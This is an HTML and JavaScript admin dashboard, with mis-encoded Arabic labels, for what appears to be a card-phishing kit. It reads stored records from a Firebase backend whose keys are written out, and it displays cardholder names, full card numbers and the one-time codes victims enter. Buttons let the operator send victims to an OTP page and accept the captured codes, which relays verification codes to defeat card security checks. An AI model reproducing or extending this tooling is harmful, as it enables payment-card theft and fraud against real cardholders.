<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø§Øª Ø§Ù„Ù…Ø³Ø¬Ù„Ø©</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #1a56db;
            --bg: #f9fafb;
            --white: #ffffff;
            --border: #e5e7eb;
        }
        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); margin: 0; padding: 20px; }
        .container { max-width: 1100px; margin: 0 auto; }
        
        /* Stats Section */
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: var(--white); padding: 20px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); display: flex; align-items: center; gap: 15px; }
        .stat-card i { font-size: 24px; color: var(--primary); }
        .stat-val { font-size: 22px; font-weight: bold; display: block; }
        .stat-label { color: #6b7280; font-size: 14px; }

        /* Table Section */
        .table-container { background: var(--white); border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 20px; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; text-align: right; }
        th { padding: 15px; border-bottom: 2px solid var(--border); color: #374151; }
        td { padding: 15px; border-bottom: 1px solid var(--border); }
        
        .badge { padding: 4px 10px; border-radius: 6px; font-size: 12px; font-weight: 600; }
        .badge-visa { background: #eef2ff; color: #4338ca; }
        .badge-master { background: #fff7ed; color: #9a3412; }
        .badge-mada { background: #f0fdf4; color: #166534; }
        .badge-amex { background: #eff6ff; color: #1d4ed8; }
        
        .status-pending { color: #f59e0b; font-weight: bold; }
        .status-success { color: #10b981; font-weight: bold; }
        .status-error { color: #ef4444; font-weight: bold; }
        .status-otp_required { color: #8b5cf6; font-weight: bold; background-color: #f5f3ff; padding: 2px 8px; border-radius: 4px; }
        .status-otp_sent { color: #3b82f6; font-weight: bold; background-color: #eff6ff; padding: 2px 8px; border-radius: 4px; }
        
        .delete-btn { color: #ef4444; border: none; background: none; cursor: pointer; font-size: 18px; }
        .loader { text-align: center; padding: 40px; font-size: 18px; color: var(--primary); }
        
        .action-buttons { display: flex; gap: 8px; flex-wrap: wrap; }
        .action-btn { background: none; border: none; cursor: pointer; font-size: 16px; padding: 6px 8px; border-radius: 6px; transition: all 0.3s; }
        .action-btn:hover { transform: translateY(-2px); }
        
        .otp-link { color: #1d4ed8; text-decoration: none; font-weight: bold; }
        .otp-link:hover { text-decoration: underline; }
        
        .card-info { 
            background: #f8fafc; 
            padding: 15px; 
            border-radius: 8px; 
            margin: 5px 0; 
            border-right: 3px solid var(--primary);
        }
    </style>
</head>
<body>

<div class="container">
    <header style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
        <h1><i class="fa-solid fa-database"></i> Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… - Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ù…Ù„ÙƒÙŠØ©</h1>
        <button onclick="location.reload()" style="padding: 8px 16px; background: #fff; border: 1px solid var(--border); border-radius: 8px; cursor: pointer;">
            <i class="fa-solid fa-rotate"></i> ØªØ­Ø¯ÙŠØ«
        </button>
    </header>

    <div class="stats-grid">
        <div class="stat-card"><i class="fa-solid fa-credit-card"></i><div><span class="stat-val" id="total-count">0</span><span class="stat-label">Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ</span></div></div>
        <div class="stat-card"><i class="fa-solid fa-hourglass-half"></i><div><span class="stat-val" id="pending-count">0</span><span class="stat-label">Ù‚ÙŠØ¯ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±</span></div></div>
        <div class="stat-card"><i class="fa-solid fa-key"></i><div><span class="stat-val" id="otp-count">0</span><span class="stat-label">Ù…Ø·Ù„ÙˆØ¨ OTP</span></div></div>
        <div class="stat-card"><i class="fa-solid fa-check-circle"></i><div><span class="stat-val" id="verified-count">0</span><span class="stat-label">ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚</span></div></div>
    </div>

    <div class="table-container">
        <div id="loading" class="loader"><i class="fas fa-spinner fa-spin"></i> Ø¬Ø§Ø±ÙŠ Ø¬Ù„Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Firebase...</div>
        <table id="cards-table" style="display: none;">
            <thead>
                <tr>
                    <th>Ø§Ù„Ù†ÙˆØ¹</th>
                    <th>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</th>
                    <th>Ø§Ù„ØªØ§Ø±ÙŠØ®</th>
                    <th>Ø§Ù„Ø­Ø§Ù„Ø©</th>
                    <th>Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª</th>
                </tr>
            </thead>
            <tbody id="table-body"></tbody>
        </table>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
    import { getFirestore, collection, getDocs, deleteDoc, doc, query, orderBy, updateDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyDuTdRONBY01xWrf9qZ81C2UQHg1V-64to",
        authDomain: "vasa-a14ca.firebaseapp.com",
        projectId: "vasa-a14ca",
        storageBucket: "vasa-a14ca.firebasestorage.app",
        messagingSenderId: "1083668938512",
        appId: "1:1083668938512:web:7624c955c0c54d3f7bef95",
        measurementId: "G-1ESJ0J0TZW"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    async function loadCards() {
        const tableBody = document.getElementById('table-body');
        const loading = document.getElementById('loading');
        const table = document.getElementById('cards-table');
        
        let stats = { total: 0, pending: 0, otp_required: 0, verified: 0 };

        try {
            // Ø¬Ù„Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø±ØªØ¨Ø© Ø­Ø³Ø¨ Ø§Ù„ØªØ§Ø±ÙŠØ® (Ø§Ù„Ø£Ø­Ø¯Ø« Ø£ÙˆÙ„Ø§Ù‹)
            const q = query(collection(db, "cards"), orderBy("createdAt", "desc"));
            const querySnapshot = await getDocs(q);
            
            tableBody.innerHTML = "";
            
            querySnapshot.forEach((docSnap) => {
                const data = docSnap.data();
                const id = docSnap.id;
                stats.total++;
                
                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø§Ù„Ø­Ø§Ù„Ø©
                if (data.status === 'pending') stats.pending++;
                if (data.status === 'otp_required' || data.status === 'otp_sent') stats.otp_required++;
                if (data.status === 'success') stats.verified++;

                const date = data.createdAt ? data.createdAt.toDate().toLocaleString('ar-EG') : 'ØºÙŠØ± Ù…ØªÙˆÙØ±';
                
                // Ø±Ø§Ø¨Ø· ØµÙØ­Ø© OTP
                const otpPageUrl = `${window.location.origin}/index.html?id=${id}`;
                
                // ØªØ­Ø¯ÙŠØ¯ Ø§Ø³Ù… Ø§Ù„Ø­Ø§Ù„Ø©
                let statusText = '';
                let statusClass = 'status-' + (data.status || 'pending');
                
                switch(data.status) {
                    case 'pending':
                        statusText = 'Ù‚ÙŠØ¯ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±';
                        break;
                    case 'otp_required':
                        statusText = 'ğŸ“ Ù…Ø·Ù„ÙˆØ¨ Ø¥Ø¯Ø®Ø§Ù„ OTP';
                        break;
                    case 'otp_sent':
                        statusText = data.otp ? `âœ… ØªÙ… Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯: <strong>${data.otp}</strong>` : 'ØªÙ… Ø¥Ø±Ø³Ø§Ù„ OTP';
                        break;
                    case 'success':
                        statusText = 'âœ… ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­';
                        break;
                    case 'error':
                        statusText = 'âŒ ÙØ´Ù„ Ø§Ù„ØªØ­Ù‚Ù‚';
                        break;
                    default:
                        statusText = 'Ù‚ÙŠØ¯ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±';
                }

                const row = `
                    <tr id="row-${id}">
                        <td>
                            <span class="badge badge-${data.cardType || 'visa'}">
                                ${(data.cardType || 'visa').toUpperCase()}
                            </span>
                        </td>
                        <td>
                            <div class="card-info">
                                <div><strong>Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:</strong> ${data.cardHolder || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯'}</div>
                                <div><strong>Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:</strong> <span dir="ltr">${data.cardNumber || 'ØºÙŠØ± Ù…ØªÙˆÙØ±'}</span></div>
                                ${data.verificationTime ? `<div><strong>ÙˆÙ‚Øª Ø§Ù„ØªØ­Ù‚Ù‚:</strong> ${data.verificationTime}</div>` : ''}
                            </div>
                        </td>
                        <td style="font-size: 12px; color: #666;">${date}</td>
                        <td id="status-${id}" class="${statusClass}">${statusText}</td>
                        <td>
                            <div class="action-buttons">
                                ${data.status === 'otp_sent' && data.otp ? `
                                    <button onclick="verifyOTP('${id}', '${data.otp}')" class="action-btn" style="color:green; background:#f0fdf4;" title="Ù‚Ø¨ÙˆÙ„ Ø§Ù„ÙƒÙˆØ¯">
                                        <i class="fa-solid fa-check-circle"></i> Ù‚Ø¨ÙˆÙ„
                                    </button>
                                    <button onclick="updateStatus('${id}', 'error')" class="action-btn" style="color:orange; background:#fff7ed;" title="Ø±ÙØ¶ Ø§Ù„ÙƒÙˆØ¯">
                                        <i class="fa-solid fa-times-circle"></i> Ø±ÙØ¶
                                    </button>
                                ` : ''}
                                
                                ${(!data.status || data.status === 'pending') ? `
                                    <button onclick="sendOTPRequest('${id}', '${otpPageUrl}')" class="action-btn" style="color:#8b5cf6; background:#f5f3ff;" title="Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ OTP">
                                        <i class="fa-solid fa-key"></i> Ø·Ù„Ø¨ OTP
                                    </button>
                                ` : ''}
                                
                                ${data.status === 'otp_required' ? `
                                    <a href="${otpPageUrl}" target="_blank" class="otp-link" title="ÙØªØ­ ØµÙØ­Ø© OTP">
                                        <i class="fa-solid fa-external-link"></i> ØµÙØ­Ø© Ø§Ù„ØªØ­Ù‚Ù‚
                                    </a>
                                ` : ''}
                                
                                <button onclick="deleteCard('${id}')" class="action-btn delete-btn" title="Ø­Ø°Ù">
                                    <i class="fa-solid fa-trash-can"></i>
                                </button>
                            </div>
                        </td>
                    </tr>
                `;
                tableBody.innerHTML += row;
            });

            // ØªØ­Ø¯ÙŠØ« ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
            document.getElementById('total-count').innerText = stats.total;
            document.getElementById('pending-count').innerText = stats.pending;
            document.getElementById('otp-count').innerText = stats.otp_required;
            document.getElementById('verified-count').innerText = stats.verified;

            loading.style.display = 'none';
            table.style.display = 'table';

        } catch (error) {
            console.error("Error: ", error);
            loading.innerText = "ÙØ´Ù„ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª. ØªØ£ÙƒØ¯ Ù…Ù† Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firestore.";
        } 
    }

    // ÙˆØ¸ÙŠÙØ© Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ OTP
    window.sendOTPRequest = async (id, otpPageUrl) => {
        if (confirm("Ù‡Ù„ ØªØ±ÙŠØ¯ Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…ØŸ")) {
            try {
                await updateDoc(doc(db, "cards", id), { 
                    status: 'otp_required',
                    otpRequestTime: new Date().toLocaleString('ar-EG')
                });
                
                // ÙØªØ­ ØµÙØ­Ø© OTP ÙÙŠ Ù†Ø§ÙØ°Ø© Ø¬Ø¯ÙŠØ¯Ø©
                window.open(otpPageUrl, '_blank', 'width=500,height=700');
                
                alert("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ OTP Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…. ØªÙ… ÙØªØ­ ØµÙØ­Ø© Ø§Ù„ØªØ­Ù‚Ù‚ ÙÙŠ Ù†Ø§ÙØ°Ø© Ø¬Ø¯ÙŠØ¯Ø©.");
                loadCards();
            } catch (error) {
                alert("Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨: " + error.message);
            }
        }
    };

    // ÙˆØ¸ÙŠÙØ© Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† OTP
    window.verifyOTP = async (id, otpCode) => {
        if (confirm(`Ù‡Ù„ ØªØ±ÙŠØ¯ Ù‚Ø¨ÙˆÙ„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ ${otpCode}ØŸ`)) {
            try {
                await updateDoc(doc(db, "cards", id), { 
                    status: 'success',
                    verifiedAt: new Date().toLocaleString('ar-EG'),
                    verifiedBy: 'Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„'
                });
                
                alert("ØªÙ… Ù‚Ø¨ÙˆÙ„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­!");
                loadCards();
            } catch (error) {
                alert("Ø®Ø·Ø£ ÙÙŠ Ù‚Ø¨ÙˆÙ„ Ø§Ù„Ø±Ù…Ø²: " + error.message);
            }
        }
    };

    // ÙˆØ¸ÙŠÙØ© Ø§Ù„Ø­Ø°Ù
    window.deleteCard = async (id) => {
        if (confirm("Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø°Ù Ù‡Ø°Ù‡ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©ØŸ")) {
            try {
                await deleteDoc(doc(db, "cards", id));
                document.getElementById(`row-${id}`).remove();
                alert("ØªÙ… Ø§Ù„Ø­Ø°Ù Ø¨Ù†Ø¬Ø§Ø­");
                loadCards();
            } catch (error) {
                alert("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø­Ø°Ù: " + error.message);
            }
        }
    };

    // ÙˆØ¸ÙŠÙØ© ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø­Ø§Ù„Ø© Ø§Ù„Ø¹Ø§Ù…Ø©
    window.updateStatus = async (id, newStatus) => {
        try {
            await updateDoc(doc(db, "cards", id), { status: newStatus });
            alert("ØªÙ… ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø­Ø§Ù„Ø© Ø¨Ù†Ø¬Ø§Ø­");
            loadCards();
        } catch (e) {
            alert("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØ­Ø¯ÙŠØ«: " + (e.message || e));
        }
    };

    loadCards();
</script>
</body>
</html>
